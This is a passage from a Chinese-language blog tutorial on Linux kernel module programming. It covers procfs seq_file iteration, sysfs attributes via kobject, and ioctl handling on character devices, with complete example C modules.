class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called after the beginning of a sequence. </span></span><br><span class="line"><span class="comment"> * It is called until the return is NULL (this ends the sequence). </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">my_seq_next</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *tmp_v = (<span class="type">unsigned</span> <span class="type">long</span> *)v; </span><br><span class="line">    (*tmp_v)++; </span><br><span class="line">    (*pos)++; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called at the end of a sequence. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_seq_stop</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* nothing to do, we use a static value in start() */</span> </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called for each &quot;step&quot; of a sequence. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_seq_show</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">loff_t</span> *spos = (<span class="type">loff_t</span> *)v; </span><br><span class="line"> </span><br><span class="line">    seq_printf(s, <span class="string">&quot;%Ld\n&quot;</span>, *spos); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure gather &quot;function&quot; to manage the sequence */</span> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> <span class="title">my_seq_ops</span> =</span> &#123; </span><br><span class="line">    .start = my_seq_start, </span><br><span class="line">    .next = my_seq_next, </span><br><span class="line">    .stop = my_seq_stop, </span><br><span class="line">    .show = my_seq_show, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called when the /proc file is open. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">return</span> seq_open(file, &amp;my_seq_ops); </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure gather &quot;function&quot; that manage the /proc file */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">my_file_ops</span> =</span> &#123; </span><br><span class="line">    .proc_open = my_open, </span><br><span class="line">    .proc_read = seq_read, </span><br><span class="line">    .proc_lseek = seq_lseek, </span><br><span class="line">    .proc_release = seq_release, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_file_ops</span> =</span> &#123; </span><br><span class="line">    .open = my_open, </span><br><span class="line">    .read = seq_read, </span><br><span class="line">    .llseek = seq_lseek, </span><br><span class="line">    .release = seq_release, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">procfs4_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">entry</span>;</span> </span><br><span class="line"> </span><br><span class="line">    entry = proc_create(PROC_NAME, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;my_file_ops); </span><br><span class="line">    <span class="keyword">if</span> (entry == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;Error: Could not initialize /proc/%s\n&quot;</span>, PROC_NAME); </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">procfs4_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    remove_proc_entry(PROC_NAME, <span class="literal">NULL</span>); </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s removed\n&quot;</span>, PROC_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(procfs4_init); </span><br><span class="line">module_exit(procfs4_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="Chapter-6-Interacting-with-your-module"><a href="#Chapter-6-Interacting-with-your-module" class="headerlink" title="Chapter 6 Interacting with your module"></a>Chapter 6 Interacting with your module</h2><p><code>sysfs</code>可以实现在用户空间通过在模块中读取或设置变量与运行的内核进行交互。查看系统的<code>sysfs</code>目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /sys</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/image-20240115145741324.png" class="" title="image-20240115145741324">

<p>可以在文件系统中以常规文件的形式为kobjects导出属性。Sysfs将文件I&#x2F;O操作转发给为属性定义的方法，提供了提供了读写内核属性的方法。</p>
<p>一个属性的简单定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> &#123;</span> </span><br><span class="line">    <span class="type">char</span> *name; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span> </span><br><span class="line">    <span class="type">umode_t</span> mode; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">sysfs_create_file</span><span class="params">(<span class="keyword">struct</span> kobject * kobj, <span class="type">const</span> <span class="keyword">struct</span> attribute * attr)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">sysfs_remove_file</span><span class="params">(<span class="keyword">struct</span> kobject * kobj, <span class="type">const</span> <span class="keyword">struct</span> attribute * attr)</span>;</span><br></pre></td></tr></table></figure>

<p>例如，设备驱动模型定义了<code>device_attribute</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device_attribute</span> &#123;</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> <span class="title">attr</span>;</span> </span><br><span class="line">    <span class="type">ssize_t</span> (*show)(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> device_attribute *attr, </span><br><span class="line">                    <span class="type">char</span> *buf); </span><br><span class="line">    <span class="type">ssize_t</span> (*store)(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> device_attribute *attr, </span><br><span class="line">                    <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> count); </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">device_create_file</span><span class="params">(<span class="keyword">struct</span> device *, <span class="type">const</span> <span class="keyword">struct</span> device_attribute *)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">device_remove_file</span><span class="params">(<span class="keyword">struct</span> device *, <span class="type">const</span> <span class="keyword">struct</span> device_attribute *)</span>;</span><br></pre></td></tr></table></figure>

<p>为了读写attributes，show()和store()方法必须声明定义。一般情况下include&#x2F;linux&#x2F;sysfs.h提供了便捷的宏用来简化定义。</p>
<p>以下为一个hello world模块，通过sysfs实现了创建一个可以访问的变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * hello-sysfs.c sysfs example </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kobject.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sysfs.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">mymodule</span>;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* the variable you want to be able to change */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myvariable = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">myvariable_show</span><span class="params">(<span class="keyword">struct</span> kobject *kobj, </span></span><br><span class="line"><span class="params">                               <span class="keyword">struct</span> kobj_attribute *attr, <span class="type">char</span> *buf)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d\n&quot;</span>, myvariable); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">myvariable_store</span><span class="params">(<span class="keyword">struct</span> kobject *kobj, </span></span><br><span class="line"><span class="params">                                <span class="keyword">struct</span> kobj_attribute *attr, <span class="type">char</span> *buf, </span></span><br><span class="line"><span class="params">                                <span class="type">size_t</span> count)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%du&quot;</span>, &amp;myvariable); </span><br><span class="line">    <span class="keyword">return</span> count; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_attribute</span> <span class="title">myvariable_attribute</span> =</span> </span><br><span class="line">    __ATTR(myvariable, <span class="number">0660</span>, myvariable_show, (<span class="type">void</span> *)myvariable_store); </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mymodule_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> error = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;mymodule: initialised\n&quot;</span>); </span><br><span class="line"> </span><br><span class="line">    mymodule = kobject_create_and_add(<span class="string">&quot;mymodule&quot;</span>, kernel_kobj); </span><br><span class="line">    <span class="keyword">if</span> (!mymodule) </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line"> </span><br><span class="line">    error = sysfs_create_file(mymodule, &amp;myvariable_attribute.attr); </span><br><span class="line">    <span class="keyword">if</span> (error) &#123; </span><br><span class="line">        pr_info(<span class="string">&quot;failed to create the myvariable file &quot;</span> </span><br><span class="line">                <span class="string">&quot;in /sys/kernel/mymodule\n&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> error; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mymodule_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;mymodule: Exit success\n&quot;</span>); </span><br><span class="line">    kobject_put(mymodule); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(mymodule_init); </span><br><span class="line">module_exit(mymodule_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>效果图如下，成功实现对sys文件下模块的变量的读写。</p>
<img src="/posts/79c0f484/image-20240115150838900.png" class="" title="image-20240115150838900">

<p>以上情况下，使用了kobject来创建sysfs下的目录，并与其下的属性文件进行信息交互。<strong>kobject</strong>起初用于统一内核代码的简单方法，用于管理引用计数对象，目前时将设备驱动与sysfs接口联系在一起的粘合剂。</p>
<h2 id="Chapter-7-Talking-To-Device-Files"><a href="#Chapter-7-Talking-To-Device-Files" class="headerlink" title="Chapter 7. Talking To Device Files"></a>Chapter 7. Talking To Device Files</h2><h3 id="7-1-Talking-to-Device-Files-write-and-IOCTLS"><a href="#7-1-Talking-to-Device-Files-write-and-IOCTLS" class="headerlink" title="7.1 Talking to Device Files (write and IOCTLS)"></a>7.1 Talking to Device Files (write and IOCTLS)</h3><p>设备文件（&#x2F;dev目录包含了所有linux中使用的外部设备，但是不包含外部设备的驱动信息，外舍驱动在&#x2F;kernel&#x2F;drivers）代表了物理设备。大多数的设备既有输入也有输出，因此需要一些方法令内核中的设备驱动从进程中获取输出发送给设备，通过打开设备文件并写入实现。下面例子实现了device_write。</p>
<p>当然只有这些写入操作还不够，假设有场景需要串口与解调器通信，可以通过读写设备文件实现消息的接受与发送，<strong>但是应该如何与串口本身通信是一个问题</strong>，例如波特率等配置信息。</p>
<p>Unix系统提供了<code>ioctl（Input Output Control）</code>函数，每个设备都有自己的ioctl命令，可以读取（从进程发送信息到内核），写入（从内核返回信息到进程）等。</p>
<p><code>ioctl</code>函数有三个参数：合适的设备文件描述符，<code>ioctl</code>数，参数（long型）可以强制转换来传递任何内容。可以传递结构体指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * ioctl.c </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ioctl_arg</span> &#123;</span> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> val; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Documentation/userspace-api/ioctl/ioctl-number.rst */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOC_MAGIC <span class="string">&#x27;\x66&#x27;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALSET _IOW(IOC_MAGIC, 0, struct ioctl_arg) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALGET _IOR(IOC_MAGIC, 1, struct ioctl_arg) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALGET_NUM _IOR(IOC_MAGIC, 2, int) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALSET_NUM _IOW(IOC_MAGIC, 3, int) </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VAL_MAXNR 3 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_NAME <span class="string">&quot;ioctltest&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> test_ioctl_major = <span class="number">0</span>; </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> num_of_dev = <span class="number">1</span>; </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">test_ioctl_cdev</span>;</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> ioctl_num = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> &#123;</span> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="type">rwlock_t</span> lock; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">test_ioctl_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, </span></span><br><span class="line"><span class="params">                             <span class="type">unsigned</span> <span class="type">long</span> arg)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span> =</span> filp-&gt;private_data; </span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ioctl_arg</span> <span class="title">data</span>;</span> </span><br><span class="line">    <span class="built_in">memset</span>(&amp;data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data)); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALSET: </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(&amp;data, (<span class="type">int</span> __user *)arg, <span class="keyword">sizeof</span>(data))) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> done; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        pr_alert(<span class="string">&quot;IOCTL set val:%x .\n&quot;</span>, data.val); </span><br><span class="line">        write_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        ioctl_data-&gt;val = data.val; </span><br><span class="line">        write_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALGET: </span><br><span class="line">        read_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        val = ioctl_data-&gt;val; </span><br><span class="line">        read_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        data.val = val; </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user((<span class="type">int</span> __user *)arg, &amp;data, <span class="keyword">sizeof</span>(data))) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> done; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALGET_NUM: </span><br><span class="line">        retval = __put_user(ioctl_num, (<span class="type">int</span> __user *)arg); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALSET_NUM: </span><br><span class="line">        ioctl_num = arg; </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">        retval = -ENOTTY; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">done: </span><br><span class="line">    <span class="keyword">return</span> retval; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">test_ioctl_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, </span></span><br><span class="line"><span class="params">                               <span class="type">size_t</span> count, <span class="type">loff_t</span> *f_pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span> =</span> filp-&gt;private_data; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="type">int</span> retval; </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    read_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">    val = ioctl_data-&gt;val; </span><br><span class="line">    read_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (; i &lt; count; i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user(&amp;buf[i], &amp;val, <span class="number">1</span>)) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> out; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    retval = count; </span><br><span class="line">out: </span><br><span class="line">    <span class="keyword">return</span> retval; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">test_ioctl_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_alert(<span class="string">&quot;%s call.\n&quot;</span>, __func__); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (filp-&gt;private_data) &#123; </span><br><span class="line">        kfree(filp-&gt;private_data); </span><br><span class="line">        filp-&gt;private_data = <span class="literal">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">test_ioctl_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span>;</span> </span><br><span class="line"> </span><br><span class="line">    pr_alert(<span class="string">&quot;%s call.\n&quot;</span>, __func__); </span><br><span class="line">    ioctl_data = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> test_ioctl_data), GFP_KERNEL); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ioctl_data == <span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line"> </span><br><span class="line">    rwlock_init(&amp;ioctl_data-&gt;lock); </span><br><span class="line">    ioctl_data-&gt;val = <span class="number">0xFF</span>; </span><br><span class="line">    filp-&gt;private_data = ioctl_data; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123; </span><br><span class="line">    .owner = THIS_MODULE, </span><br><span class="line">    .open = test_ioctl_open, </span><br><span class="line">    .release = test_ioctl_close, </span><br><span class="line">    .read = test_ioctl_read, </span><br><span class="line">    .unlocked_ioctl = test_ioctl_ioctl, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ioctl_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">dev_t</span> dev; </span><br><span class="line">    <span class="type">int</span> alloc_ret = <span class="number">-1</span>; </span><br><span class="line">    <span class="type">int</span> cdev_ret = <span class="number">-1</span>; </span><br><span class="line">    alloc_ret = alloc_chrdev_region(&amp;dev, <span class="number">0</span>, num_of_dev, DRIVER_NAME); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (alloc_ret) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    test_ioctl_major = MAJOR(dev); </span><br><span class="line">    cdev_init(&amp;test_ioctl_cdev, &amp;fops); </span><br><span class="line">    cdev_ret = cdev_add(&amp;test_ioctl_cdev, dev, num_of_dev); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (cdev_ret) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    pr_alert(<span class="string">&quot;%s driver(major: %d) installed.\n&quot;</span>, DRIVER_NAME, </span><br><span class="line">             test_ioctl_major); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">error: </span><br><span class="line">    <span class="keyword">if</span> (cdev_ret == <span class="number">0</span>) </span><br><span class="line">        cdev_del(&amp;test_ioctl_cdev); </span><br><span class="line">    <span class="keyword">if</span> (alloc_ret == <span class="number">0</span>) </span><br><span class="line">        unregister_chrdev_region(dev, num_of_dev); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">ioctl_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">dev_t</span> dev = MKDEV(test_ioctl_major, <span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line">    cdev_del(&amp;test_ioctl_cdev); </span><br><span class="line">    unregister_chrdev_region(dev, num_of_dev); </span><br><span class="line">    pr_alert(<span class="string">&quot;%s driver removed.\n&quot;</span>, DRIVER_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(ioctl_init); </span><br><span class="line">module_exit(ioctl_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>); </span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;This is test_ioctl module&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>test_ioctl_ioctl</code>函数有一参数<code>cmd</code>，这个就是<code>ioctl_number</code>，<code>ioctl number</code>编码了major number，ioctl类型，命令和参数。通常使用宏表示(_IO, _IOR, _IOW, _IOWR)。内核与程序都应包含ioctl的头文件。内核模块调用的头文件是<code>chardev.h</code>，程序调用为<code>userspace_ioctl.c</code>。</p>
<p>另外，我们需要注意的是，对共享资源的并发访问将导致竞态条件。。解决方法是使用原子比较与交换(atomic Compare-And-Swap (CAS))。</p>
<p>一个完整的与device file通信的示例</p>
<p><code>char_dev2.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * chardev2.c - Create an input/output character device </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/atomic.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> <span class="comment">/* Specifically, a module */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/printk.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> <span class="comment">/* for get_user and put_user */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/errno.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;chardev.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;char_dev&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_LEN 80 </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> </span><br><span class="line">    CDEV_NOT_USED = <span class="number">0</span>, </span><br><span class="line">    CDEV_EXCLUSIVE_OPEN = <span class="number">1</span>, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Is the device open right now? Used to prevent concurrent access into </span></span><br><span class="line"><span class="comment"> * the same device </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span 